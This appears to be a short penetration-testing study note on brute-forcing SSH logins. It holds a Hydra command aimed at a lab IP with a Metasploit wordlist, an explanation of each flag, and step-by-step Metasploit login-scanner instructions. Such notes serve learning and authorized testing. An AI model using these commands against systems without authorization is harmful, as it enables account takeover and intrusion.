---
description: >-
  Attempting logging in with different credentials in the hope of getting the
  right one.
---

# Brute Force Attacks

## Password Brute Force (with Hydra):

> Tool: Hydra
>
> Description: In-built into Kali Linux, designed for brute forcing credentials.

Example:

{% code title="" %}
```bash
root@kali:~# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.2.4:22 -t 4 
```
{% endcode %}

-> "hydra": tool name.

-> "-l": user we are trying to brute force logon for.

-> "-P": directory to password list to use to attempt brute force.

-> "ssh://10.0.2.4:22": what target we are actually brute forcing.

-> "-t": threads. The number of parallel connections to attempt multiple password combinations at the same time. A thread number too great may lead to crashes or overloading the target so use in moderation. Mainly for speed purposes.

***

## Password Brute Force (with Metasploit):

1. Search for ssh modules using "search ssh".
2. Look for a module along the lines of "ssh login" or "ssh login check scanner".
3. Type in "use \[module]".
4. Type in "options".
5. Type in "set username \[username]".
6. Type in "set pass file \[password file directory path]".
7. Type in "set rhost(s) \[host IP(s)]".
8. OPTIONAL: you can change the number of threads like this: "set threads \[thread number]".
9. Run "exploit".

